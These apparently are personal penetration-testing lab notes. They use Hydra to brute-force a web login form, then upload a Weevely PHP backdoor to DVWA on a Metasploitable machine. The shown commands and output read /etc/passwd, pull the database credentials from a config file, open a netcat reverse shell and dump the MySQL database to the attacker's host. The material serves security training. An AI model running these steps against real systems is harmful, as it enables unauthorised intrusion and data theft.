 "^USER^" (resp. "^USER64^") and "^PASS^" (resp. "^PASS64^") placeholders (FORM PARAMETERS)
Third is the string that it checks for an *invalid* login (by default)
 Invalid condition login check can be preceded by "F=", successful condition
 login check must be preceded by "S=".
 This is where most people get it wrong. You have to check the webapp what a
 failed string looks like and put it in this parameter!
The following parameters are optional:
 (c|C)=/page/uri     to define a different page to gather initial cookies from
 (g|G)=              skip pre-requests - only use this when no pre-cookies are required
 (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
                 ^USER[64]^ and ^PASS[64]^ can also be put into these headers!
                 Note: 'h' will add the user-defined header at the end
                 regardless it's already being sent by Hydra or not.
                 'H' will replace the value of that header if it exists, by the
                 one supplied by the user, or add the header at the end
Note that if you are going to put colons (:) in your headers you should escape them with a backslash (\).
 All colons that are not option separators should be escaped (see the examples above and below).
 You can specify a header without escaping the colons, but that way you will not be able to put colons
 in the header value itself, as they will be interpreted by hydra as option separators.

Examples:
 "/login.php:user=^USER^&pass=^PASS^:incorrect"
 "/login.php:user=^USER64^&pass=^PASS64^&colon=colon\:escape:S=authlog=.*success"
 "/login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed"
 "/:user=^USER&pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^:H=User-Agent\: wget"
 "/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:reason=:C=/exchweb"

> hydra [ip_address] -l [username] -P [password] [service]

> hydra 192.168.104.6 -l zaw -P wordlist.txt http-post-form "/mutillidae/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:F=Not Logged In"

ZAD Attack Proxy - ZAP
----------------

- Auto find vulnerabilities in web app
- free and easy to use
- can also be used for manual testing

Used tool - ZAP

Post Exploitation
----------------

"Post exploitation by using Weevely"

Basic Bash to Weevely

1) generate weevely backdoor.
2) upload it to any server(make sure you have a direct url)
3) download it from target server.
4) connect to it from Kali

> weevely [target_address]/dvwa/hackable/uploads/[file_name].php [password]

weevely > ls

The remote script execution triggers an error 500, check script and payload integrity
114-1149126_apple-clipart-black-and-white-image-small-clip.png
backdoor.php
dvwa_email.png
index.jpeg
lorem_text.txt

Weevely Basic

1) run any sheel cmd directly
2) run weevely funcs
3) list all weevely funcs
4) get help about specific func

weevely > whoami
weevely > [func_name]
weevely > help
weevely > [func_name] -h

www-data@192.168.104.6:/var/www/dvwa/hackable/uploads $ help

The remote script execution triggers an error 500, check script and payload integrity

 :net_ifconfig                 Get network interfaces addresses.                                    
 :net_phpproxy                 Install PHP proxy on the target.                                     
 :net_curl                     Perform a curl-like HTTP request.                                    
 :net_mail                     Send mail.                                                           
 :net_proxy                    Run local proxy to pivot HTTP/HTTPS browsing through the target.     
 :net_scan                     TCP Port scan.                                                       
 :sql_console                  Execute SQL query or run console.                                    
 :sql_dump                     Multi dbms mysqldump replacement.                                    
 :file_gzip                    Compress or expand gzip files.                                       
 :file_clearlog                Remove string from a file.                                           
 :file_touch                   Change file timestamp.                                               
 :file_cp                      Copy single file.                                                    
 :file_cd                      Change current working directory.                                    
 :file_download                Download file from remote filesystem.                                
 :file_mount                   Mount remote filesystem using HTTPfs.                                
 :file_check                   Get attributes and permissions of a file.                            
 :file_enum                    Check existence and permissions of a list of paths.                  
 :file_zip                     Compress or expand zip files.                                        
 :file_upload2web              Upload file automatically to a web folder and get corresponding URL. 
 :file_edit                    Edit remote file on a local editor.                                  
 :file_webdownload             Download an URL.                                                     
 :file_read                    Read remote file from the remote filesystem.                         
 :file_bzip2                   Compress or expand bzip2 files.                                      
 :file_ls                      List directory content.                                              
 :file_upload                  Upload file to remote filesystem.                                    
 :file_rm                      Remove remote file.                                                  
 :file_find                    Find files with given names and attributes.                          
 :file_tar                     Compress or expand tar archives.                                     
 :file_grep                    Print lines matching a pattern in multiple files.                    
 :backdoor_tcp                 Spawn a shell on a TCP port.                                         
 :backdoor_reversetcp          Execute a reverse TCP shell.                                         
 :bruteforce_sql               Bruteforce SQL database.                                             
 :system_extensions            Collect PHP and webserver extension list.                            
 :system_procs                 List running processes.                                              
 :system_info                  Collect system information.                                          
 :audit_filesystem             Audit the file system for weak permissions.                          
 :audit_disablefunctionbypass  Bypass disable_function restrictions with mod_cgi and .htaccess.     
 :audit_suidsgid               Find files with SUID or SGID flags.                                  
 :audit_phpconf                Audit PHP configuration.                                             
 :audit_etcpasswd              Read /etc/passwd with different techniques.                          
 :shell_su                     Execute commands with su.                                            
 :shell_php                    Execute PHP commands.                                                
 :shell_sh                     Execute shell commands. 

weevely > :help

weevely > system_info

weevely > :system_info

The remote script execution triggers an error 500, check script and payload integrity
The remote script execution triggers an error 500, check script and payload integrity
+--------------------+--------------------------------------------------------------------------------+
| document_root      | /var/www/                                                                      |
| whoami             | www-data                                                                       |
| hostname           |                                                                                |
| pwd                | /var/www/dvwa/hackable/uploads                                                 |
| open_basedir       |                                                                                |
| safe_mode          | False                                                                          |
| script             | /dvwa/hackable/uploads/backdoor.php                                            |
| script_folder      | /var/www/dvwa/hackable/uploads                                                 |
| uname              | Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 |
| os                 | Linux                                                                          |
| client_ip          | 192.168.104.3                                                                  |
| max_execution_time | 30                                                                             |
| php_self           | /dvwa/hackable/uploads/backdoor.php                                            |
| dir_sep            | /                                                                              |
| php_version        | 5.2.4-2ubuntu5.10                                                              |
+--------------------+--------------------------------------------------------------------------------+

weevely > audit_etcpasswd -h

The remote script execution triggers an error 500, check script and payload integrity
usage: audit_etcpasswd [-h] [-real] [-vector {posix_getpwuid,file,fread,file_get_contents,base64}]

Read /etc/passwd with different techniques.

optional arguments:
  -h, --help            show this help message and exit
  -real                 Filter only real users
  -vector {posix_getpwuid,file,fread,file_get_contents,base64}

weevely > audit_etcpasswd -vector posix_getpwuid

The remote script execution triggers an error 500, check script and payload integrity
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
bind:x:105:113::/var/cache/bind:/bin/false
postfix:x:106:115::/var/spool/postfix:/bin/false
ftp:x:107:65534::/home/ftp:/bin/false
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
distccd:x:111:65534::/:/bin/false
telnetd:x:112:120::/nonexistent:/bin/false
proftpd:x:113:65534::/var/run/proftpd:/bin/false
statd:x:114:65534::/var/lib/nfs:/bin/false
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash

weevely > whoami
weevely > shell_sh -h

usage: shell_sh [-h] [-stderr_redirection STDERR_REDIRECTION]
                [-vector {system,passthru,shell_exec,exec,popen,proc_open,python_eval,perl_system,pcntl}]
                command [command ...]

Execute shell commands.

positional arguments:
  command               Shell command

optional arguments:
  -h, --help            show this help message and exit
  -stderr_redirection STDERR_REDIRECTION
  -vector {system,passthru,shell_exec,exec,popen,proc_open,python_eval,perl_system,pcntl}

weevely > shell_sh [command]
weevely > shell_sh whoami

weevely > shell_sh -vector [vector] [command]

weevely > file_download -h

The remote script execution triggers an error 500, check script and payload integrity
usage: file_download [-h] [-vector {file,fread,file_get_contents,base64}] rpath lpath

Download file from remote filesystem.

positional arguments:
  rpath                 Remote file path
  lpath                 Local file path

optional arguments:
  -h, --help            show this help message and exit
  -vector {file,fread,file_get_contents,base64}

weevely > file_download -vector [vector] [file_name] -host [host] [location_to_store_file]

"In hacker's host, create a dir to receive downloaded file"

> cd ../..
> ls

bin   dev  initrd.img      lib    lib64   lost+found  mnt  proc  run   srv  tmp  var      vmlinuz.old
boot  etc  home    initrd.img.old  lib32  libx32  media       opt  root  sbin  sys  usr  vmlinuz

> sudo mkdir hahaha && sudo chmod -R 755 hahaha

bin   dev  hahaha  initrd.img      lib    lib64   lost+found  mnt  proc  run   srv  tmp  var      vmlinuz.old
boot  etc  home    initrd.img.old  lib32  libx32  media       opt  root  sbin  sys  usr  vmlinuz

"Run weevely with sudo cmd"

weevely > file_download -vector file lorem_text.txt /hahaha/lorem_text.txt

The remote script execution triggers an error 500, check script and payload integrity

weevely > file_upload -h

The remote script execution triggers an error 500, check script and payload integrity
usage: file_upload [-h] [-force] [-content CONTENT] [-vector {file_put_contents,fwrite}] [lpath] rpath

Upload file to remote filesystem.

positional arguments:
  lpath                 Local file path
  rpath                 Remote file path

optional arguments:
  -h, --help            show this help message and exit
  -force                Force overwrite
  -content CONTENT      Optionally specify the file content
  -vector {file_put_contents,fwrite}

weevely > file_upload /hahaha/lorem_text.txt ./lorem_text_uploaded.txt

The remote script execution triggers an error 500, check script and payload integrity
True

weevely > ls -l

The remote script execution triggers an error 500, check script and payload integrity
total 96
-rw------- 1 www-data www-data 54593 Aug 22 10:11 114-1149126_apple-clipart-black-and-white-image-small-clip.png
-rw------- 1 www-data www-data   744 Aug 29 09:58 backdoor.php
-rw-r--r-- 1 www-data www-data   667 Mar 16  2010 dvwa_email.png
-rw------- 1 www-data www-data  8573 Aug 22 10:51 index.jpeg
-rw------- 1 www-data www-data    10 Aug 22 11:26 lorem_text.jpg
-rw------- 1 www-data www-data    10 Aug 22 11:25 lorem_text.svg
-rw------- 1 www-data www-data    10 Aug 22 10:12 lorem_text.txt
-rw-r--r-- 1 www-data www-data    10 Aug 29 10:50 lorem_text_uploaded.txt

weevely > backdoor_reversetcp -h

The remote script execution triggers an error 500, check script and payload integrity
usage: backdoor_reversetcp [-h] [-shell SHELL] [-no-autonnect]
                           [-vector {netcat_bsd,netcat,python,devtcp,perl,ruby,telnet,python_pty}]
                           lhost port

Execute a reverse TCP shell.

positional arguments:
  lhost                 Local host
  port                  Port to spawn

optional arguments:
  -h, --help            show this help message and exit
  -shell SHELL          Specify shell
  -no-autonnect         Skip autoconnect
  -vector {netcat_bsd,netcat,python,devtcp,perl,ruby,telnet,python_pty}

weevely > backdoor_reversetcp -vector netcat [your_ip] [your_port]

Accessing The Database

1) Find and read config file.
2) Use sql_console to drop to sql console or sql_dump to dump the whole database.
    e.g - sql_console -h, sql_dump -h

weevely > sql_console -h

The remote script execution triggers an error 500, check script and payload integrity
usage: sql_console [-h] [-user USER] [-passwd PASSWD] [-host [HOST]] [-dbms {mysql,pgsql}] [-database DATABASE]
                   [-query QUERY] [-encoding ENCODING]

Execute SQL query or run console.

optional arguments:
  -h, --help           show this help message and exit
  -user USER           SQL username
  -passwd PASSWD       SQL password
  -host [HOST]         Db host or host:port
  -dbms {mysql,pgsql}  Db type
  -database DATABASE   Database name (Only PostgreSQL)
  -query QUERY         Execute a single query
  -encoding ENCODING   Db text encoding

weevely > sql_dmp -h

The remote script execution triggers an error 500, check script and payload integrity
usage: sql_dump [-h] [-dbms {mysql,pgsql,sqlite,dblib}] [-host [HOST]] [-lpath LPATH]
                [-vector {mysqldump_sh,mysqldump_php}]
                db user passwd

Multi dbms mysqldump replacement.

positional arguments:
  db                    Db to dump
  user                  SQL username
  passwd                SQL password

optional arguments:
  -h, --help            show this help message and exit
  -dbms {mysql,pgsql,sqlite,dblib}
                        Db type. Vector 'mysqldump_sh' supports only 'mysql'.
  -host [HOST]          Db host or host:port
  -lpath LPATH          Dump to local path (default: temporary file)
  -vector {mysqldump_sh,mysqldump_php}

weevely > cd /var/www/dvwa/config

weevely > file_read -vector file config.inc.php

The remote script execution triggers an error 500, check script and payload integrity
<?php

# If you are having problems connecting to the MySQL database and all of the variables below are correct
# try changing the 'db_server' variable from localhost to 127.0.0.1. Fixes a problem due to sockets.
# Thanks to digininja for the fix.

# Database management system to use

$DBMS = 'MySQL';
#$DBMS = 'PGSQL';

# Database variables

$_DVWA = array();
$_DVWA[ 'db_server' ] = 'localhost';
$_DVWA[ 'db_database' ] = 'd';
$_DVWA[ 'db_user' ] = 'root';
$_DVWA[ 'db_password' ] = '';

# Only needed for PGSQL
$_DVWA[ 'db_port' ] = '5432'; 

?>

weevely > sql_dump -dbms mysql -host localhost -lpath /hahaha/sql_dump.txt -vector mysqldump_sh dvwa root ''

The remote script execution triggers an error 500, check script and payload integrity
SQL dump saved to '/hahaha/sql_dump.txt'

"Open and view sql_dump.txt file in notepad."



























































